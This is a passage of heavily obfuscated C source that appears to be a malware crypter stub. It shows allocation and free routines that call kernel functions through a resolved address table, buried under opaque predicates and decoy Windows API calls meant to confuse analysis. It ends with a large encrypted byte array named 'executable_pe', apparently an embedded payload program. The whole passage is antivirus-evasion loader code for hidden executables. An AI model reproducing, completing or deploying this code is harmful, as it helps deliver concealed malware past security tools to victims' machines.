              if (((v9a27643475573a4951a3349a9aec2b19_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9a27643475573a4951a3349a9aec2b19_prime_opaque == ((unsigned int) 2)))
              {
                vc2797ad351d2212ba3ba44b406119101_computation_opaque = vc2797ad351d2212ba3ba44b406119101_computation_opaque + ((unsigned int) 52);
                vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque = v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque <= vc2797ad351d2212ba3ba44b406119101_computation_opaque;
                v98f53355f1039dc5a8ce3ac7ed284147_useless_opaque = v9a27643475573a4951a3349a9aec2b19_prime_opaque || vc2797ad351d2212ba3ba44b406119101_computation_opaque;
                vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque = vc2797ad351d2212ba3ba44b406119101_computation_opaque | vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque;
                v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque = vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque + v9a27643475573a4951a3349a9aec2b19_prime_opaque;
              }
            }
            v59e447ec2746d14dcfceac477f50df99 = GetModuleFileNameA(v09342cb984dbfcae99c29ea94c1f185d, va06c13caa6bcdaf52a77e04e7d35e44c, v5ccb9fbfb55b6ded00592c35a5e6ac58);
          }
          unsigned long vabe84adedd082c183427204041db531c = (unsigned long) 0x27684b30;
          void * v4e06698348b613e27d617b3361d29a44 = (void *) 0x9b340555;
          int vaef0b87982567954b9e3b3e85d9485dc = (int) 0x24604f05;
          int vf4315daa8b069df86cf98f1f84e1faa0 = (int) 0x3377a2bb;
          vf4315daa8b069df86cf98f1f84e1faa0 = GetLocaleInfoW(v476903109d93d92a80c9ab950b0b569d, vabe84adedd082c183427204041db531c, v4e06698348b613e27d617b3361d29a44, vaef0b87982567954b9e3b3e85d9485dc);
        }
        return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(0, size, 0x1000 | 0x2000, 0x04);
        unsigned int v51d048df3d58516a5f30a0e3ef901dc5_useless_opaque = (unsigned int) 2966395228;
        unsigned int v41f2640d1c1506730defc9623c2a3097_computation_opaque = (unsigned int) (&v51d048df3d58516a5f30a0e3ef901dc5_useless_opaque);
        if (((v9a27643475573a4951a3349a9aec2b19_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9a27643475573a4951a3349a9aec2b19_prime_opaque == ((unsigned int) 2)))
        {
          unsigned int vf26b22f97afbb23a3d65e3aea9a019af_true_opaque = (((v41f2640d1c1506730defc9623c2a3097_computation_opaque * v41f2640d1c1506730defc9623c2a3097_computation_opaque) + v41f2640d1c1506730defc9623c2a3097_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        }
      }
    }
    unsigned int v765b58877650cbc988a2db42c73652c1_useless_opaque = (unsigned int) 3167520019;
    unsigned int va634a6206d52d90ad4c96d7bd3428bb0_random_opaque = (unsigned int) (&v765b58877650cbc988a2db42c73652c1_useless_opaque);
  }
}

void replacement_free(void *ptr)
{
  {
    {
      unsigned int v4a7b8967fab093adc68852f71dd73335_useless_opaque = (unsigned int) 1105828599;
      unsigned int v5818c5f1c32ba4635a11ef5b72522963_computation_opaque = (unsigned int) (&v4a7b8967fab093adc68852f71dd73335_useless_opaque);
      unsigned int v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque = (((v5818c5f1c32ba4635a11ef5b72522963_computation_opaque * v5818c5f1c32ba4635a11ef5b72522963_computation_opaque) + v5818c5f1c32ba4635a11ef5b72522963_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        unsigned int vfddba3ecb38e323a223347664aa0ea1b_useless_opaque = (unsigned int) 3533666193;
        unsigned int vb92e670be5d463060d2c00c95ff52aa9_computation_opaque = (unsigned int) (&vfddba3ecb38e323a223347664aa0ea1b_useless_opaque);
        unsigned int v97fbc842bdf1679af865c57cec8da4cc_true_opaque = (((vb92e670be5d463060d2c00c95ff52aa9_computation_opaque * vb92e670be5d463060d2c00c95ff52aa9_computation_opaque) + vb92e670be5d463060d2c00c95ff52aa9_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        if (v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque)
        {
          if (v97fbc842bdf1679af865c57cec8da4cc_true_opaque)
          {
            if (v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque)
            {
              if (ptr)
              {
                ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[10])(ptr, 0, 0x8000);
                if (!v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque)
                {
                  void * v34f8853737b4d8e35861d5c4b87e0d0e = (void *) 0x57219e32;
                  unsigned long vd1b17970aa6347bc17b63150659978f8 = (unsigned long) 0x4bd0748d;
                  unsigned long v93850a0c7ad3891d2fd18ccffde2794c = (unsigned long) 0xcc6b43a5;
                  if (!v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque)
                  {
                    vfddba3ecb38e323a223347664aa0ea1b_useless_opaque = v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque | ((unsigned int) 71);
                    vb92e670be5d463060d2c00c95ff52aa9_computation_opaque = v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque % v4a7b8967fab093adc68852f71dd73335_useless_opaque;
                    vb92e670be5d463060d2c00c95ff52aa9_computation_opaque = v97fbc842bdf1679af865c57cec8da4cc_true_opaque - v5818c5f1c32ba4635a11ef5b72522963_computation_opaque;
                    vfddba3ecb38e323a223347664aa0ea1b_useless_opaque = vfddba3ecb38e323a223347664aa0ea1b_useless_opaque - vb92e670be5d463060d2c00c95ff52aa9_computation_opaque;
                    vfddba3ecb38e323a223347664aa0ea1b_useless_opaque = v97fbc842bdf1679af865c57cec8da4cc_true_opaque * vfddba3ecb38e323a223347664aa0ea1b_useless_opaque;
                    v4a7b8967fab093adc68852f71dd73335_useless_opaque = vfddba3ecb38e323a223347664aa0ea1b_useless_opaque % ((unsigned int) 50);
                    if (!v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque)
                    {
                      v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque = v5818c5f1c32ba4635a11ef5b72522963_computation_opaque / v4a7b8967fab093adc68852f71dd73335_useless_opaque;
                    }
                  }
                  v93850a0c7ad3891d2fd18ccffde2794c = SnmpListen(v34f8853737b4d8e35861d5c4b87e0d0e, vd1b17970aa6347bc17b63150659978f8);
                }
                if (!v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque)
                {
                  vb92e670be5d463060d2c00c95ff52aa9_computation_opaque = vfddba3ecb38e323a223347664aa0ea1b_useless_opaque || v97fbc842bdf1679af865c57cec8da4cc_true_opaque;
                  v97fbc842bdf1679af865c57cec8da4cc_true_opaque = v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque <= vb92e670be5d463060d2c00c95ff52aa9_computation_opaque;
                  v97fbc842bdf1679af865c57cec8da4cc_true_opaque = v5818c5f1c32ba4635a11ef5b72522963_computation_opaque / vb92e670be5d463060d2c00c95ff52aa9_computation_opaque;
                  v5818c5f1c32ba4635a11ef5b72522963_computation_opaque = v5818c5f1c32ba4635a11ef5b72522963_computation_opaque < ((unsigned int) 71);
                  v97fbc842bdf1679af865c57cec8da4cc_true_opaque = v4a7b8967fab093adc68852f71dd73335_useless_opaque <= v08b181b63413b45bdd9f8a2a44fcc9fa_true_opaque;
                }
              }
            }
          }
        }
      }
    }
    unsigned int vd4d762beabb88878e456b31c2cd7eb35_useless_opaque = (unsigned int) 418936498;
    unsigned int v3ca79955a43dfc0e6e979924772217cd_computation_opaque = (unsigned int) 0;
    unsigned int v63e9e95698350e23f55d23e27355b142_computation_opaque = (unsigned int) 3;
    unsigned int v504ee2db934922eef9918e88accd32f2_computation_opaque = (unsigned int) (&vd4d762beabb88878e456b31c2cd7eb35_useless_opaque);
    v504ee2db934922eef9918e88accd32f2_computation_opaque = (v504ee2db934922eef9918e88accd32f2_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (v504ee2db934922eef9918e88accd32f2_computation_opaque < ((unsigned int) 3))
    {
      v504ee2db934922eef9918e88accd32f2_computation_opaque = (unsigned int) 3;
      unsigned int vcda1da3c67e2a75bea675a031a6e5ad4_useless_opaque = (unsigned int) 1099055856;
      unsigned int vb5b708f22590eb84897470ae485e3ccf_computation_opaque = (unsigned int) 0;
      unsigned int v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque = (unsigned int) 3;
      unsigned int v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque = (unsigned int) (&vcda1da3c67e2a75bea675a031a6e5ad4_useless_opaque);
      v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque = (v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque < ((unsigned int) 3))
      {
        v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque = (unsigned int) 3;
      }
      while (vb5b708f22590eb84897470ae485e3ccf_computation_opaque != ((unsigned int) 1))
      {
        v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque += (unsigned int) 2;
        vb5b708f22590eb84897470ae485e3ccf_computation_opaque = (unsigned int) 1;
        v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque = (unsigned int) 3;
        while ((v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque * v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque) <= v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque)
        {
          if ((v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque % v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque) == ((unsigned int) 0))
          {
            vb5b708f22590eb84897470ae485e3ccf_computation_opaque = (unsigned int) 0;
          }
          v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque = v9dd31d199f19b71e3f1ab8a88b74a0f1_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v0822946720f92762fe97eedcdc93e7f6_prime_opaque = v79b47eff6c07eb7311fc8cd8355583e5_computation_opaque;
    }
    while (v3ca79955a43dfc0e6e979924772217cd_computation_opaque != ((unsigned int) 1))
    {
      v504ee2db934922eef9918e88accd32f2_computation_opaque += (unsigned int) 2;
      v3ca79955a43dfc0e6e979924772217cd_computation_opaque = (unsigned int) 1;
      v63e9e95698350e23f55d23e27355b142_computation_opaque = (unsigned int) 3;
      unsigned int v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque = (unsigned int) 1494864613;
      unsigned int v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque = (unsigned int) 0;
      unsigned int vb92d9ab115c109157156e9aee675e2d2_computation_opaque = (unsigned int) 3;
      unsigned int vdb0557888da50bf449a00236d96a1c59_computation_opaque = (unsigned int) (&v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque);
      vdb0557888da50bf449a00236d96a1c59_computation_opaque = (vdb0557888da50bf449a00236d96a1c59_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vdb0557888da50bf449a00236d96a1c59_computation_opaque < ((unsigned int) 3))
      {
        vdb0557888da50bf449a00236d96a1c59_computation_opaque = (unsigned int) 3;
      }
      while (v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque != ((unsigned int) 1))
      {
        vdb0557888da50bf449a00236d96a1c59_computation_opaque += (unsigned int) 2;
        v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque = (unsigned int) 1;
        vb92d9ab115c109157156e9aee675e2d2_computation_opaque = (unsigned int) 3;
        while ((vb92d9ab115c109157156e9aee675e2d2_computation_opaque * vb92d9ab115c109157156e9aee675e2d2_computation_opaque) <= vdb0557888da50bf449a00236d96a1c59_computation_opaque)
        {
          if ((vdb0557888da50bf449a00236d96a1c59_computation_opaque % vb92d9ab115c109157156e9aee675e2d2_computation_opaque) == ((unsigned int) 0))
          {
            v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque = (unsigned int) 0;
          }
          vb92d9ab115c109157156e9aee675e2d2_computation_opaque = vb92d9ab115c109157156e9aee675e2d2_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int vb776e312fd25f2a232a41adb02a997d4_prime_opaque = vdb0557888da50bf449a00236d96a1c59_computation_opaque;
      while ((v63e9e95698350e23f55d23e27355b142_computation_opaque * v63e9e95698350e23f55d23e27355b142_computation_opaque) <= v504ee2db934922eef9918e88accd32f2_computation_opaque)
      {
        if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
        {
          v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque = v504ee2db934922eef9918e88accd32f2_computation_opaque == vdb0557888da50bf449a00236d96a1c59_computation_opaque;
          vdb0557888da50bf449a00236d96a1c59_computation_opaque = v504ee2db934922eef9918e88accd32f2_computation_opaque | vb92d9ab115c109157156e9aee675e2d2_computation_opaque;
          v3ca79955a43dfc0e6e979924772217cd_computation_opaque = v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque - v504ee2db934922eef9918e88accd32f2_computation_opaque;
          vb776e312fd25f2a232a41adb02a997d4_prime_opaque = vb776e312fd25f2a232a41adb02a997d4_prime_opaque / vdb0557888da50bf449a00236d96a1c59_computation_opaque;
          v504ee2db934922eef9918e88accd32f2_computation_opaque = vd4d762beabb88878e456b31c2cd7eb35_useless_opaque | ((unsigned int) 27);
          v504ee2db934922eef9918e88accd32f2_computation_opaque = v63e9e95698350e23f55d23e27355b142_computation_opaque != vd4d762beabb88878e456b31c2cd7eb35_useless_opaque;
          v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque = v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque | vb776e312fd25f2a232a41adb02a997d4_prime_opaque;
          if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
          {
            v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque = vdb0557888da50bf449a00236d96a1c59_computation_opaque != ((unsigned int) 25);
            vdb0557888da50bf449a00236d96a1c59_computation_opaque = vb776e312fd25f2a232a41adb02a997d4_prime_opaque / v3ca79955a43dfc0e6e979924772217cd_computation_opaque;
          }
        }
        if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
        {
          unsigned long v11c6f5cae5ad55dfd2607f73c16b6b4d = (unsigned long) 0xf5a580c5;
          void * v84965760fb914c741b38a6d8dece8a25 = (void *) 0x545081a2;
          int vd26947bab97cc075f25a6d54e28160f7 = (int) 0xb336c791;
          void * vadfdfab21b63034f67675d105d9b10d0 = (void *) 0x7e0c9fa4;
          if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
          {
            vdb0557888da50bf449a00236d96a1c59_computation_opaque = v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque * vd4d762beabb88878e456b31c2cd7eb35_useless_opaque;
            v63e9e95698350e23f55d23e27355b142_computation_opaque = v78350d6b74ecd3d26a3344d2f2bce60d_useless_opaque || v63e9e95698350e23f55d23e27355b142_computation_opaque;
            vdb0557888da50bf449a00236d96a1c59_computation_opaque = vdb0557888da50bf449a00236d96a1c59_computation_opaque != vd4d762beabb88878e456b31c2cd7eb35_useless_opaque;
            vb92d9ab115c109157156e9aee675e2d2_computation_opaque = v504ee2db934922eef9918e88accd32f2_computation_opaque == v63e9e95698350e23f55d23e27355b142_computation_opaque;
            vd4d762beabb88878e456b31c2cd7eb35_useless_opaque = vb776e312fd25f2a232a41adb02a997d4_prime_opaque <= vd4d762beabb88878e456b31c2cd7eb35_useless_opaque;
          }
          if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
          {
            void * vbe816ac6547c19eac14a12e2266f01dc = (void *) 0xd007ee3f;
            void * v11c50592a46ddae060994277e6c98141 = (void *) 0x6f1576e5;
            unsigned long v14698d5fad47b60abb3a16ccc846287b = (unsigned long) 0x129d104d;
            if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
            {
              v3ca79955a43dfc0e6e979924772217cd_computation_opaque = vb92d9ab115c109157156e9aee675e2d2_computation_opaque != ((unsigned int) 10);
              vd4d762beabb88878e456b31c2cd7eb35_useless_opaque = vd4d762beabb88878e456b31c2cd7eb35_useless_opaque / v3ca79955a43dfc0e6e979924772217cd_computation_opaque;
              if (!(((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2))))
              {
                vd4d762beabb88878e456b31c2cd7eb35_useless_opaque = v63e9e95698350e23f55d23e27355b142_computation_opaque - v6b15aa8577b5e8fa2f3842f15e500fde_computation_opaque;
              }
            }
            if (((vb776e312fd25f2a232a41adb02a997d4_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vb776e312fd25f2a232a41adb02a997d4_prime_opaque == ((unsigned int) 2)))
            {
              unsigned long v5543b8c08a8bd54c3e91d431176d7483 = (unsigned long) 0xf7a6bf29;
              v5543b8c08a8bd54c3e91d431176d7483 = GetModuleFileNameA(vbe816ac6547c19eac14a12e2266f01dc, v11c50592a46ddae060994277e6c98141, v14698d5fad47b60abb3a16ccc846287b);
            }
          }
          int vae248f6ed98cdef7b662742a75216314 = (int) 0x2f60d385;
          int vc58c98f854ed79f8e0513c410ecce1d4 = (int) 0x85bac2e0;
          vc58c98f854ed79f8e0513c410ecce1d4 = IdnToNameprepUnicode(v11c6f5cae5ad55dfd2607f73c16b6b4d, v84965760fb914c741b38a6d8dece8a25, vd26947bab97cc075f25a6d54e28160f7, vadfdfab21b63034f67675d105d9b10d0, vae248f6ed98cdef7b662742a75216314);
        }
        if ((v504ee2db934922eef9918e88accd32f2_computation_opaque % v63e9e95698350e23f55d23e27355b142_computation_opaque) == ((unsigned int) 0))
        {
          v3ca79955a43dfc0e6e979924772217cd_computation_opaque = (unsigned int) 0;
        }
        v63e9e95698350e23f55d23e27355b142_computation_opaque = v63e9e95698350e23f55d23e27355b142_computation_opaque + ((unsigned int) 2);
      }

    }

    unsigned int v6bb2d2b1f30c0d6035b5a251b755e565_prime_opaque = v504ee2db934922eef9918e88accd32f2_computation_opaque;
  }
  unsigned int v773fd290f7ec20623ae4236a9ad2020d_useless_opaque = (unsigned int) 2307272571;
  unsigned int v51c1a786a13bc86e15091813f8cd3805_random_opaque = (unsigned int) (&v773fd290f7ec20623ae4236a9ad2020d_useless_opaque);
}

char executable_pe[] = "\x80\x31\x8e\x08\xc4\xb8\xb8\xc0\x53\x30\x59\x69\xd4\x8c\x53\x11\xf6\xab\x49\x5a\xc2\xc4\xa4\x41\x41\xe8\x48\xbc\x35\xc7\x22\x79\xe0\xed\x88\x68\x99\xfa\x2a\xa0\x72\x68\x29\xcd\x5f\xd1\x6c\x76\x66\xf9\x04\x57\xb8\x02\xd4\x1d\xbb\x54\xab\xa5\x56\xe5\xdb\x2c\x95\x07\xa5\xd1\xbf\xc0\x08\x9c\xe5\xe8\xc0\x1e\x98\x8f\xf4\xb8\x2c\x80\xac\xa4\xe9\x38\xa3\x88\xbc\x0a\xbe\x73\x79\xca\x91\xf9\x5e\x07\x8d\x30\xa9\x71\x2a\xae\xe1\x37\xf3\xec\x8f\xa2\xbc\xbf\xd9\x43\xe9\x2e\x17\x8d\xfe\xb5\xc6\x50\xcd\x8c\x81\xd9\xb4\x15\x00\x10\x1f\xc5\xb9\x06\x3f\x16\x6a\x06\xa6\x99\x11\xc7\xc0\xaa\xcb\x00\xdf\xd3\xcf\x01\xd1\x27\x68\xcf\x3e\x1d\xdf\x88\xda\xa3\x97\xb6\x18\xfb\xc7\xa8\xaf\xd1\xe1\xa0\x22\x17\x55\xed\x94\xff\x0b\x00\xa7\x0e\x36\x21\x3d\x94\x22\x56\x4d\xf2\x7c\x08\xb8\xe8\x46\x19\x4b\x78\x1c\xe6\xf4\x49\x26\x88\xe8\xab\x51\x28\xe8\x9c\xe8\x9b\xfa\x24\x17\x8c\x90\xd4\x60\xef\x93\xcb\x42\xef\x17\xc9\x86\x03\x17\xcc\xae\x78\x6a\xab\xb0\x4f\x91\x7e\xa4\xc9\x8a\x44\x21\x56\xd3\x01\x23\xf6\x90\x7e\x27\x05\xc0\x9c\x62\x31\x92\x79\xc4\xbe\xe4\x44\x1a\x26\x94\x9d\x43\xa9\xd5\x66\x4b\x77\x51\xdb\xdb\x36\x5a\x4a\x25\x62\x2e\x58\x57\xeb\x4f\xc3\xbf\x3b\xc4\xcb\xeb\xaa\xff\xe9\x88\xb2\xb8\x6d\x59\xf2\xfe\x60\x03\x93\xdc\xdc\x7c\xf8\xd9\x69\x36\x6a\x69\xee\x34\x5e\xd1\x51\xe6\xd3\x79\x3e\xc0\x10\xf7\xb9\x6a\xf0\xc3\x27\xc9\xc2\x7d\x45\x5c\xad\xea\xc0\x54\xe4\xeb\xe3\x0d\x30\xa8\x0f\xab\xba\x62\x64\xd8\xb9\x31\x5a\xf2\x2c\x79\xaf\xa9\x3e\x87\x89\x2c\x6e\x7f\xa3\x12\x3b\xf4\xa0\x16\x40\x8b\xd7\xeb\xd6\x79\xca\x68\xf7\xfd\x96\x58\x9f\xd0\x7b\xd6\x18\x7f\x69\x44\x88\x68\x2a\x4f\x85\x20\xa8\xab\x4d\xad\x6d\x78\xb4\x29\xe5\x62\xec\x09\x2e\xbf\x51\xd9\xbe\x7f\xcd\xa2\x79\x30\x54\x57\xa1\xa4\x6a\x4b\x11\xff\x8b\xcf\x97\xd9\xa7\xf2\x36\x20\x68\xbb\x9f\xa5\x06\xc0\x3b\xe6\xc7\x88\xfb\xd4\x27\xd1\xda\xaa\xf8\xd9\x6f\x1b\x14\x3f\x3b\x1a\x01\x2f\x39\x08\x41\x74\x0e\xa8\x32\x39\x32\x2f\xb8\x65\x96\x5c\x9d\xbd\x66\xc8\x99\x28\xcf\x8d\x9a\x68\x49\x2e\xfe\xec\x3c\x7d\x63\x98\x06\xf9\x07\xbd\x73\x5e\xa4\x10\x85\x56\x76\xa9\x82\xd6\xbb\xcc\x5a\x2a\x6e\xd8\x0a\x47\x7f\xcb\x09\x7a\x34\xaf\x5b\xe7\x69\xbe\x07\x27\x44\x18\x0e\xb9\x1b\x40\x11\x6d\x74\x14\x47\x66\x13\xc4\xd0\x91\xa4\xfd\x01\xc5\x5b\x08\x19\x07\xae\x04\x34\xc3\x1b\x20\x41\xae\x18\xae\x38\x37\x21\xce\x18\x80\x62\x96\xcd\x36\x4d\xfe\x54\xf9\xfc\x42\x00\x94\xc5\xf7\x06\x3b\x14\x80\x0e\x91\xc1\xd6\x3e\x38\x8f\x44\x81\xd6\x4b\xce\x8e\xd8\x5c\xd0\x6f\x67\x7b\xfd\x30\xd1\x51\x1b\x99\x8a\x07\xb4\x01\xa3\xc6\x3e\x16\x53\x91\xed\x21\x91\x89\xee\xfd\x0a\x09\xb0\x32\x38\x86\xbd\x72\xf9\x70\x24\x5c\x05\x9b\xb8\x6c\x6e\xcf\xd4\x6b\x5c\x42\x7d\xf7\x92\xc8\x51\x79\x8a\x2b\xb3\xb8\xdf\x7d\x15\xeb\xdf\x86\x2e\xfd\xf7\x6c\xe7\x8d\x02\x25\x40\x26\xa5\xa1\xd6\xd5\xa5\x84\x9b\x6f\x05\x98\x24\xe6\xe0\x2d\x4a\xf5\xbd\x73\x5e\x00\x17\xd0\x87\x14\x5c\x2c\x4f\xe5\xbf\x93\xcb\x61\x9a\x77\x19\x0e\xb4\x02\xf2\xb2\xcf\xfc\x3d\x5d\xd5\x8f\x8e\x1d\xf8\x31\xa0\xd0\xa0\xd2\xbd\xbe\x49\xe4\xec\x9c\xf3\x29\x30\xca\xf2\xed\x1c\x43\xae\x58\x85\x31\x76\xbc\x99\xcd\x42\xad\x53\x04\xdd\x73\xd5\x49\x23\xe8\x9e\x1d\xb7\xc8\x97\xbd\xd0\xc7\x00\x44\x95\xfb\xb6\x71\xff\x6e\x5b\x81\x11\xc4\x3c\xca\x3c\x03\xc2\xa5\xa3\x4d\x16\x4e\x67\xd6\x8f\x20\x14\x80\xa7\x85\x1d\xf1\x8b\xdf\x1e\xd5\x09\x86\x86\x48\x82\xcc\x63\x50\xed\xd9\x4d\x71\xde\xd1\x06\x37\x80\xf6\xc4\xf4\x6d\x36\xa1\x20\x14\x04\x29\xbb\xf8\x78\x1a\x07\x14\x9f\xe0\x52\xdd\x23\x1a\xe8\x41\x71\x9e\x83\x03\xa4\x43\x5d\x25\x37\x23\x4e\xde\x99\x7f\x1c\x67\x75\x2e\xf5\xf0\x9a\x99\x59\x26\x51\x91\x24\xcb\xa3\x6d\x58\xb4\xce\xfc\xa5\x2a\x79\x99\x83\x7e\xb4\xc3\x58\xc7\x48\xf4\xdc\x9f\xed\xd3\x13\x9b\x5d\x36\xcf\xa9\x12\xe8\xf2\xe2\x6e\x57\xdc\x3d\x05\x79\x47\xfe\xc9\x0c\xf1\xb0\xdc\xf4\x7a\x2d\x3a\x21\x94\x5c\x14\x9f\xd9\x30\xae\x66\x45\x5c\x6f\x7a\x58\x25\xf5\xae\xfc\x09\x55\x0e\xc5\x23\x38\x29\xa3\xa5\x0d\x9f\x10\x4e\x41\xcf\xb8\x97\x15\x34\x27\xf0\xe0\x61\x73\x06\x95\x03\x3e\x4b\xbd\xc9\x24\xcc\x22\x40\x5b\xa2\x81\x57\xad\xf6\x0a\x3b\x1e\x4f\xac\xdc\xb0\xf7\xdd\x79\x41\x1b\xf3\x82\x8d\x99\x82\x62\x68\xb2\x80\x9b\xd0\xed\x11\xa9\xa9\x4e\xc5\x42\x87\xd0\x3a\xd0\xbc\x5d\xba\x89\x90\x04\xec\xcd\xbb\xb8\x44\xe6\xdf\xd4\x73\x04\x42\xbd\x2f\x22\x48\x31\x69\x52\xbb\xd3\x30\x53\x1c\x01\xf1\x70\x89\xcf\x1b\x7b\x04\xb9\x23\xe2\x55\xd8\x1e\x42\xc0\x42\xb2\x5d\x6a\x0f\x7e\x99\x1e\xe6\xaf\x7d\xb3\x3b\x35\x33\x86\x7f\x70\x7a\x5b\xfa\x17\x8f\x2c\xc4\xe5\xf5\xff\x18\x87\xbf\x60\xd9\x2e\xe2\x95\x2a\x83\x43\x7a\x64\xd7\xf9\x89\x62\xec\x2b\x8a\x07\xb2\x08\xaf\x4a\x69\x5b\x5c\xf6\x5d\xfc\x15\x6b\xf0\x65\x40\x53\x3a\x14\xad\x72\xe9\x9f\x7e\x58\xf5\xd8\xef\x7e\x02\x1f\x6e\x91\x36\x2a\x13\xa2\x1f\x2d\xcc\x10\xb1\xb6\xfb\xf0\x2b\x41\x60\x83\x24\xf2\xad\x92\x43\xa3\x52\xe6\x8d\xe3\x71\xcb\xdb\xc1\xca\x4f\xaa\xf0\x37\x6a\xe9\x25\x9c\xd4\x2f\xa5\x31\xd8\x43\xc9\xd8\x49\xa4\xac\xf5\x6a\x99\xb9\x2e\xd4\x49\x57\xdb\x0a\xa2\xdd\x9e\x67\x18\x62\x6b\x7a\x17\x5d\x74\xe6\x3b\xf0\x7b\xcb\xe8\x33\xe0\xd3\x3c\x02\x85\x52\x6b\x09\x42\x18\xe3\x2e\x7d\x3e\x00\x4d\xe2\x91\xd0\x50\x9f\x92\xe1\x23\x6c\xb0\x8b\x8e\xad\x78\xd7\x3b\xe8\x13\xfa\xbc\xdd\x92\xf9\xf9\x76\x26\xff\xb1\xd3\xab\xb1\x83\xee\x1f\x30\xba\xc3\x9a\x47\x37\x04\xc4\x0d\xb9\x97\x68\x93\x07\xa8\x99\x36\xfa\xbd\x4a\xdb\x93\x42\x44\xd7\x65\x19\x22\x30\x0b\x42\x07\x22\x78\x27\xaa\x49\xc3\x84\x36\xc5\x08\x4d\x1b\xc4\x0d\x38\xb3\xc2\xcc\x85\xd2\xc1\xff\x56\x18\xe5\xbc\x6f\x8e\x1e\x2f\xd6\x11\x76\x0a\x7b\xc2\xaf\xf5\xe4\x30\xd9\x1a\x33\x90\x87\xc9\x68\x83\xcc\xaa\x95\xb2\xfb\x33\x1a\xe6\x4d\xdf\x21\xfb\x6f\x01\x82\x2f\x5a\xc0\x2f\x4a\xe9\x8d\x84\x14\xf7\xe1\x09\x28\x57\xb1\x90\xc9\xac\xc4\x8d\x4a\x91\x39\x06\xf4\x79\xbb\xfb\x8a\x4e\x6d\x06\x27\xf8\xe2\xd3\x9a\x87\xe5\x4c\xe6\xa3\xa4\x13\x7b\xd4\xdb\x28\x73\xa4\xda\x2d\xf2\x03\x59\x0a\x98\x83\x1a\xcd\x8e\xf4\x8d\x1a\x51\xc0\x00\x17\xf2\x01\xeb\x94\x10\x13\xea\xe5\x98\x3b\x23\x60\xd3\xe2\x34\x35\x72\x91\xf9\xce\x66\xaf\x65\xd3\x9b\xed\x33\xd6\xbf\x90\x5a\x2b\x3a\x17\x7f\x9c\xc4\x15\x1d\x0f\x38\x3f\x2f\xb0